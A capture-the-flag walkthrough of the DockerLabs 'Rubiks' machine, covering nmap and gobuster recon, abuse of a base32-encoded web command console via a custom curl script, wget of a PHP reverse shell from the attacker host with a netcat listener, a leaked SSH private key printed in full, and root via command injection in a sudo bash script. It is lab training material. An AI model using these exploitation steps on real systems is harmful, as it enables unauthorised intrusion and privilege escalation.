![Screenshot](/medium/Rubiks/Images/machine.png)

Difficulty: **medium**

Made by: **luisillo_o**

---
# Steps to pwn 🥽

* 👁️‍🗨️ [Reconnaissance](#reconnaissance)
* 🔍 [Enumeration](#enumeration)
* 🪓 [Exploitation](#exploitation)
* 🚩 [Privilege Escalation](#privilege-escalation)

---

First we make sure the machine is really up, we make sure with a command that is **ping**.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/Rubiks]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.261 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.130 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.164 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2027ms
rtt min/avg/max/mdev = 0.130/0.185/0.261/0.055 ms
```

Now, we can start the phase of **reconnaissance**

---
# Reconnaissance

We always start this phase with **nmap** to know what possible ports are open to the target.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/Rubiks]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-09 20:45 -05
Initiating ARP Ping Scan at 20:45
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 20:45, 0.20s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 20:45
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 20:45, 4.22s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000035s latency).
Scanned at 2025-11-09 20:45:06 -05 for 4s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.74 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to make the scan to search from the port 1 to the port 65535

**-n** <- With this argument we skip the DNS resolution, sometimes this type of scan can slow down the speed of our scan, and it's not that necessary to do it.

**-sS** <- With this argument, we are going to make a stealth-scan, this means that will not be establish the 3-way-handshake with the machine, and also can speed up our scan and be more "sneaky" 

**--min-rate 5000** <- With this argument nmap will send at least 5000 packages per second, this can speed up our scan significantly.

**-Pn** <- With this argument we also are going to skip the host discovery phase, this means that nmap will treat the machine as active, we do this before with our ping command.

**-vv** <- With this argument nmap will show us the results while the scan continues, this means if nmap discover a open port, will be reported immediately as the scan continues.

**--open** <- With this argument will only show us the ports that are open.

When the scan concludes we can see 2 ports open:

- Port 22 (ssh / secure shell)
- Port 80 (http / hyper-text transfer protocol)

We can try to know more about in detail to these ports also with **nmap**

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/Rubiks]
└─$ nmap -p22,80 -sCV 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-09 20:48 -05
Nmap scan report for 172.17.0.2
Host is up (0.000085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7e:3f:77:f8:5e:4e:89:42:4a:ce:14:3b:ac:59:05:74 (ECDSA)
|_  256 b4:2a:b2:f8:4a:1b:50:09:fb:17:28:b7:29:e6:9e:6d (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Did not follow redirect to http://rubikcube.dl/
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.01 seconds
```

**-p22,80** <- With this argument we are telling to nmap to only scan this 2 ports we discover before.

**-sCV** <- With this argument nmap will scan per each port his version and also a little bit more of information.

When the scan finish we can see a **redirect** to the host: http://rubikcube.dl, this is virtual hosting, then we enter the next line con the file of **/etc/hosts** to make the machine really know this domain.

```
172.17.0.2      rubikcube.dl
```

Because we see a website, we can know what technologies uses this page, we can do this with **whatweb**

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/Rubiks]
└─$ whatweb http://rubikcube.dl
http://rubikcube.dl [200 OK] Apache[2.4.58], Bootstrap[4.5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], JQuery[3.5.1], Script, Title[Tienda de Cubos Rubik]
```

We can see that uses **Bootstrap** and also **apache**, but nothing interesting, let's take a look with the browser.

![Screenshot](/medium/Rubiks/Images/image1.png)

It seems a shop here, we can see other sections from the website but nothing interesting, now we can start the **enumeration** phase.

---
# Enumeration

We can enumerate this website with **gobuster** to know what other possible directories are in the page.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/Rubiks]
└─$ gobuster dir -u http://rubikcube.dl -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,js,html
```

**dir** <- With this argument we make a enumeration of directories with the website.

**-u** <- With this argument we select the target to enumerate.

**-w** <- With this argument we select the dictionary to apply to the enumeration.

**-x** <- With this argument we can also add a extension per each payload, you can also enumerate this type of extensions like: php, py, txt, js, html and much more. But if you add more extentions it will take more longer to finish the enumeration.

And we can see this:

![Screenshot](/medium/Rubiks/Images/image2.png)

We can see another directory, let's take a look with the browser.

![Screenshot](/medium/Rubiks/Images/image3.png)

We can see like a admin panel here, we can do see really nothing here. But, we can see in the part of **"configurations"** this:

![Screenshot](/medium/Rubiks/Images/image4.png)

We can see something interesting here, a **console**, let's click on it...

But we got nothing, interesting, let's put the **myconsole.php** on the part of **/administration** in the url, something like this:

```
http://rubikcube.dl/administration/myconsole.php
```

And we see this:

![Screenshot](/medium/Rubiks/Images/image5.png)

We see a console here, but it says the website the command to execute needs to be codified, okay let's try to codify the command **whoami** with **base64**

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/Rubiks]
└─$ echo 'whoami' | base64
d2hvYW1pCg==
```

With this command we decode the string **whoami** to base64.

Now let's put the result on the console and let's click **execute command**, but we can't get nothing!

Let's try to now encode the command with **base32**.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/Rubiks]
└─$ echo 'id' | base32
NFSAU===
```

Now let's put the output to the console and let's execute again...

![Screenshot](/medium/Rubiks/Images/image6.png)

And we can execute commands to the machine! we can try to make a script with bash to make this more easy and fast to type commands on the website and make the commands be already encoded.

---
# Exploitation

```
#!/bin/bash

read -p "Enter the command: " cmd

encoded_command=$(echo $cmd | base32)

curl -X POST http://rubikcube.dl/administration/myconsole.php -d "command=$encoded_command"

echo "The encoded command is: $encoded_command"
```

With this script I are making that I can type any command, and then making a new variable called 
**encoded_command** that makes that when I type the command, be encoded with base32 and be saved in this variable.

then with **curl** we are making a POST request to the url of the website and sending the **data** of the **command** and next to it the encoded command.

And at the end of the script we are returning the encoded command to us if we want to put this same encoded command to our browser.

let's see if it works!

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/Rubiks]
└─$ ./exploit  
Enter the command: ls

......

<h4>Salida del Comando:</h4>
            <pre>configuration.php
img
index.php
myconsole.php
styles.css
</pre>
```

The script works!

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/Rubiks]
└─$ ./exploit
Enter the command: cat /etc/passwd

......

h4>Salida del Comando:</h4>
            <pre>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
luisillo:x:1001:1001::/home/luisillo:/bin/sh
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
</pre>
```

Now let's see the content of the script **myconsole.php**:

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/Rubiks]
└─$ ./exploit
Enter the command: cat myconsole.php

The interesting part is this!

if (isset($_POST[&#039;command&#039;])) {
    // Decodificar el comando de Base32
    $encoded_command = $_POST[&#039;command&#039;];
    $command = base32_decode($encoded_command);

    // Escapando el comando para prevenir inyecciones
    $command = escapeshellcmd($command);
	           ^^^^^^^^^^^^^^
	           This function limit us a bit!


    // Ejecutar el comando y obtener el resultado
    $output = shell_exec($command);
}
?&gt;
```

This function of **escapeshellcmd** filter some characters like:

- $
- %
- &
- >
- <
- ?

and a lot more, this makes almost impossible to make a reverse shell. Let's see if we can send a file to our machine to the target.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/Rubiks]
└─$ touch test
```

We are making a file without content called **test**, now let's make a server with python3 to our machine:

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/Rubiks]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
```

Now let's try to send our **test file** to the target with our **exploit**

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/Rubiks]
└─$ ./exploit 
Enter the command: wget http://192.168.0.20/test -O /tmp/test
```

With this command we are **"downloading"** the file test from our machine with our server from http to the directory **/tmp/**

**Note**: The function from php, **escapeshellcmd** don't filter the next characters:

- :
- .
- /
- -

Now let's see if really the **test file** are on the directory **/tmp** from the target machine, let's see with our **exploit**.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/Rubiks]
└─$ ./exploit
Enter the command: ls -la /tmp

.......

<h4>Salida del Comando:</h4>
            <pre>total 8
drwxrwxrwt 1 root     root     4096 Nov 10 02:46 .
drwxr-xr-x 1 root     root     4096 Nov 10 01:41 ..
-rw-r--r-- 1 www-data www-data    0 Nov 10 02:42 test
```

And yes! the test file are in the target machine!

this it means we can do **unrestricted file upload vulnerability**.

This occurs when a web application allows users to upload files without proper validation or restrictions, enabling an attacker to upload malicious files such as scripts (e.g., PHP files) that can be executed on the server. If the uploaded file is placed in a directory accessible via the web and the server is configured to execute scripts in that directory, the attacker can gain remote code execution, potentially leading to full system compromise.

Then we can make a php file to make a reverse shell from the target machine to our attacker machine.

The content from our php file is this:

![Screenshot](/medium/Rubiks/Images/image7.png)

This php file are made by **pentestmonkey**

Now with our **exploit** let's send this php file to the target machine.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/Rubiks]
└─$ ./exploit      
Enter the command: wget http://192.168.0.20/shell.php -O /tmp/shell.php
```

Now let's see if the php file are in the directory **/tmp/** with our exploit.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/Rubiks]
└─$ ./exploit
Enter the command: ls -la /tmp

.......

<h4>Salida del Comando:</h4>
            <pre>total 12
drwxrwxrwt 1 root     root     4096 Nov 10 03:03 .
drwxr-xr-x 1 root     root     4096 Nov 10 01:41 ..
-rw-r--r-- 1 www-data www-data   84 Nov 10 03:01 shel`asC
-rw-r--r-- 1 www-data www-data    0 Nov 10 02:42 test
```

Somehow the php file is this: ```shel`asC``` but don't worry, let's execute this file with our exploit.

Before doing this we make sure the our attack machine are in mode listening.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/Rubiks]
└─$ nc -lvnp {PORT}
listening on [any] {PORT} ...
```

**-l**  <- This argument makes to netcat to be in mode listening.

**-v** <- This argument activates the **verbose** mode, this will show us in more detail the connection that we receive.

**-n** <- This makes to netcat to skip the DNS lookup, and only uses the IP address directly.

**-p** <- The port we are in listening, can be any, if it's not being currently used.

Now let's execute it with our exploit.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/Rubiks]
└─$ ./exploit
Enter the command: php /tmp/shel`asC
```

Let's execute it and we see this:

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/Rubiks]
└─$ nc -lvnp 1234            
listening on [any] 1234 ...
connect to [192.168.0.20] from (UNKNOWN) [172.17.0.2] 56196
Linux 37819b691d4a 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64 x86_64 x86_64 GNU/Linux
 03:16:58 up  6:35,  0 user,  load average: 4.33, 4.89, 4.34
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (127): Inappropriate ioctl for device
bash: no job control in this shell
www-data@37819b691d4a:/$ whoami
whoami
www-data
```

And we are in! now we can do some treatment to the tty.

First of all we do this:

```
www-data@37819b691d4a:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
```

This command makes a new bash session with **script** and **/dev/null** asthe output file, because script register every command we execute in a log, but with /dev/null path, we make that log can't record commands, and **-c bash** makes script to run the shell with bash.

We do this because we want to use CTRL + C and more functions of the bash.

When we execute this, we suspend our reverse shell for a moment.

then we execute the next command in our attack machine:

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/domain]
└─$ stty raw -echo; fg
```

This command does that stty will treat the terminal.

**raw** <- With raw we are making all the data of output and input to be as raw.

**-echo** <- With this we are making that if we execute a command it will not be printed again in the output.

**; fg** <- And with this we resume our reverse shell again.

When we execute this command we reset the xterm:

```
reset xterm
```

This are going to reset the terminal.

If we want to clear our terminal we can't because the term it gonna be different of the xterm, that it have this function. we can do this in the next way to be able to clear our screen if it get nasty:

```
www-data@37819b691d4a:/$ export TERM=xterm
```

And one last thing, if we notice the display of the terminal is very tiny!

We can adjust this to be more bigger with the next command:

```
stty rows {num} columns {num}
```

and finally it looks way better!

Now, after a long enumeration on the system, on the directory from the website of the machine, in this path:

- **/var/www/html/administration/**

We can see this:

```
www-data@37819b691d4a:/var/www/html/administration$ ls -la
total 40
drwxr-xr-x 1 root root 4096 Aug 30  2024 .
drwxr-xr-x 1 root root 4096 Aug 30  2024 ..
-rwxr-xr-x 1 root root 3389 Aug 30  2024 .id_rsa
-rw-r--r-- 1 root root 6665 Aug 30  2024 configuration.php
drwxr-xr-x 2 root root 4096 Aug 30  2024 img
-rw-r--r-- 1 root root 5460 Aug 30  2024 index.php
-rw-r--r-- 1 root root 3509 Aug 30  2024 myconsole.php
-rw-r--r-- 1 root root 1825 Aug 30  2024 styles.css
```

We see a hidden file, .id_rsa, let's take a look.

```
www-data@37819b691d4a:/var/www/html/administration$ cat .id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

this a key from ssh, this key let us enter like a user without with a password.

If you remember when we see the **/etc/passwd** file we see a user **luisillo**.

This is very probably that this key belongs to the user **luisillo**.

Let's copy the content from this key to our attacker's machine and we are saving it like **id_rsa**. and lets change the permissions of the file with **chmod**.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/Rubiks]
└─$ chmod 400 id_rsa
```

and now let's login as the user **luisillo** with this key through ssh.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/Rubiks]
└─$ ssh -i id_rsa luisillo@172.17.0.2
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.16.8+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Fri Aug 30 03:00:21 2024 from 172.17.0.1
$ whoami
luisillo
```

And we are like luisillo, lateral pivoting we do here.

To escape this weird shell, we can type just  the command **bash**.

```
$ bash
luisillo@37819b691d4a:~$
```

Now it comes the phase of **privilege escalation**.

---
# Privilege Escalation

We see now something interesting with **sudo -l**

```
luisillo@37819b691d4a:~$ sudo -l
Matching Defaults entries for luisillo on 37819b691d4a:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User luisillo may run the following commands on 37819b691d4a:
    (ALL) NOPASSWD: /bin/cube
```

We can execute this code **"cube"** like ***any*** user, also like the user **root**, let's excute this command what it does.

```
luisillo@37819b691d4a:~$ sudo cube
Checker de Seguridad Por favor, introduzca un número para verificar:
Digite el número: 999



[!] Incorrecto

 La verificación ha sido completada.
```

It seems a simple command, let's see if we can actually see the content from this command.

```
luisillo@37819b691d4a:~$ cat /bin/cube
#!/bin/bash

# Inicio del script de verificación de número
echo -n "Checker de Seguridad "

# Solicitar al usuario que ingrese un número
echo "Por favor, introduzca un número para verificar:"

# Leer la entrada del usuario y almacenar en una variable
read -rp "Digite el número: " num

# Función para comprobar el número ingresado
echo -e "\n"
check_number() {
  local number=$1
  local correct_number=666

  # Verificación del número ingresado
  if [[ $number -eq $correct_number ]]; then
    echo -e "\n[+] Correcto"
  else
    echo -e "\n[!] Incorrecto"
  fi
}

# Llamada a la función para verificar el número
check_number "$num"

# Mensaje de fin de script
echo -e "\n La verificación ha sido completada."

```

This code with bash is vulnerable with command injection, because when we type the **"number"** are not properly sanitised. We can do this with this manner:

- ```funny[$(id)]```

let's see if the inside from the parenthesis execute the command **id** 

```
luisillo@37819b691d4a:~$ sudo cube
Checker de Seguridad Por favor, introduzca un número para verificar:
Digite el número: funny[$(id)]


/bin/cube: line 19: uid=0(root) gid=0(root) groups=0(root): syntax error in expression (error token is "(root) gid=0(root) groups=0(root)")

 La verificación ha sido completada.
```

And we can see, that is vulnerable to command injection now the possibilities are endless.

Im going to assign a SUID to the bash, to make a shell with privileges as the user root:

```
luisillo@37819b691d4a:~$ sudo cube
Checker de Seguridad Por favor, introduzca un número para verificar:
Digite el número: funny[$(chmod +s /bin/bash)]



[!] Incorrecto

 La verificación ha sido completada.
```

Now if we execute **bash -p** we can have a shell like the user **root**.

```
luisillo@37819b691d4a:~$ bash -p
bash-5.2# whoami
root
```

Now we are root ***...pwned!...***
